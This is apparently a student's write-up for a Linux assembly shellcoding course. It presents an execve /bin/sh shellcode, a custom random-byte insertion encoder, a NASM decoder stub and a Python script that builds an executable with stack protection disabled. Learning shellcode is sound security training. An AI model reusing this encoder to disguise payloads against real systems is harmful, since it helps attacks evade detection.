# Assignment #4: Insertion Encoder

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-670

### Problem
- Create a custom encoding scheme like the “Insertion Encoder” we showed you
- PoC with using execve-stack as the shellcode to encode with your schema and execute

### Solution

As per the requirements of this assignment, the first thing component that we need is an encoding scheme. Then, we would need to take an execve shellcode that works by using the stack, and encode it using our scheme. Finally, a decoder stub in NASM is required to decode and execute our encoded shellcode in memory. 

The scheme used for this assignment is based on the *insertion encoder* showed in the course. The scheme is complemented with insertions of randomly generated bytes and an additional control byte that specifies the length of our original shellcode. This technique allows generating polymorphic versions every time an encoded shellcode is created, as well as permits substitution of the execve shellcode by any other sequence of opcodes without having to adjust the length variable manually.

The scheme in itself is rather simple:

```
byte[0]     --> length of original shellcode
byte[odd]	--> random
byte[even]	--> original shellcode
```

The first byte of our encoded shellcode is the length of our original shellcode. Of course, this means that the maximum length we could have is 255, which is more than sufficient for any shellcoding situation. Following it, all odd bytes will contain randomly generated bytes and all even bytes will be the original shellcode.

The following execve-stack shellcode was used for this assignment:

```nasm
00000000  31C0              xor eax,eax
00000002  50                push eax
00000003  682F2F7368        push dword 0x68732f2f
00000008  682F62696E        push dword 0x6e69622f
0000000D  8D1C24            lea ebx,[esp]
00000010  50                push eax
00000011  8D1424            lea edx,[esp]
00000014  53                push ebx
00000015  8D0C24            lea ecx,[esp]
00000018  B00B              mov al,0xb
0000001A  CD80              int 0x80
```


Based on the encoding scheme proposed for this assignment, the following NASM decoder stub was written:

```nasm
; insertion decoder
;
; expected format:
;		byte[0] 	--> length of shellcode
;		byte[odd]	--> random
;		byte[even]	--> shellcode

global _start
section .text
_start:

	jmp short stage

decoder:
	pop esi
	mov dl, byte [esi] 			; byte[0] 	--> length of shellcode
	xor ecx, ecx 				; counter = 0

decode:
	mov bl, byte [esi+ecx+2]	; next shellcode byte
	mov byte [esi], bl			; move shellcode to current position
	inc esi						; next position
	inc ecx 					; counter++
	cmp cl, dl 					; at the end of shellcode?
	jnz short decode 			; 	if not, keep decoding
	jmp short shellcode			; 	else, execute decoded shellcode


stage:
	call decoder
	shellcode: db 0x1c,0x42,0x31,0xf6,0xc0,0xd0,0x50,0xe0,0x68,0xb9,0x2f,0xb2,0x2f,0x7a,0x73,0xfb,0x68,0xe6,0x68,0x8c,0x2f,0x41,0x62,0xb3,0x69,0xcc,0x6e,0x35,0x8d,0x09,0x1c,0x2a,0x24,0x8b,0x50,0x6a,0x8d,0xb4,0x14,0x14,0x24,0xdc,0x53,0xe8,0x8d,0x26,0x0c,0x0b,0x24,0x97,0xb0,0xc8,0x0b,0x59,0xcd,0xcd,0x80
```

Finally, everything was combined into a Python script that takes the execve shellcode, encodes it according to the scheme, and generates an executable file by prepending the decoder stub.

## encoder.py

```python
#!/usr/bin/python


import struct
import os
import sys

if len(sys.argv) < 2:
	sys.exit("Usage: encode.py [output.elf]")

decoder = (
	"\xeb\x13\x5e\x8a\x16\x31\xc9\x8a\x5c\x0e\x02\x88\x1e"
	"\x46\x41\x38\xd1\x75\xf4\xeb\x05\xe8\xe8\xff\xff\xff"
)

shellcode = (
	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d"
	"\x1c\x24\x50\x8d\x14\x24\x53\x8d\x0c\x24\xb0\x0b\xcd\x80"
)

if len(shellcode) > 0xff: sys.exit("Shellcode is too long.")


##### Encode using random byte insertion
#
#		byte[0]		--> length of shellcode
#		byte[odd]	--> junk
#		byte[even]	--> shellcode


junk = os.urandom(len(shellcode))

encoded = "\\x%02x" % len(shellcode)
encoded2 = "0x%02x," % len(shellcode)

for i in range(0, len(shellcode)):
	encoded += "\\x%02x\\x%02x" % (bytearray(junk)[i], bytearray(shellcode)[i])
	encoded2 += "0x%02x,0x%02x," % (bytearray(junk)[i], bytearray(shellcode)[i])



##### Generate an executable

skeleton = '''
#include<stdio.h>
#include<string.h>
unsigned char code[] = \
	"__DECODER__"
	"__SHELLCODE__";
void main()
{
	printf("Shellcode Length: %d\\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
'''

stub = ""
for d in bytearray(decoder):
	stub += "\\x%02x" % d

skeleton = skeleton.replace("__DECODER__", stub)
skeleton = skeleton.replace("__SHELLCODE__", encoded)

with open("a.c", "w") as f:
	f.write(skeleton)

os.system("gcc a.c -fno-stack-protector -z execstack")
os.rename("a.out", sys.argv[1])
os.remove("a.c")





print
print "[*] Original Shellcode Length: %d" % len(shellcode)
print "[*] Encoded Shellcode Length: %d" % (len(shellcode) * 2 + 1)
print "[*] Decoder Stub Length: %d" % len(decoder)
print "[*] Payload Length: %d" % (len(decoder) + (len(shellcode) * 2 + 1))
print
print "[+] Decoder Stub:\n\n%s" % stub
print
print "[+] Encoded Shellcode:\n\n%s\n\n%s" % (encoded, encoded2)
print
print "[+] Executable: %s" % sys.argv[1]
print

```

## Example

A sample run produces the following output:

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-4/a4.png "Example")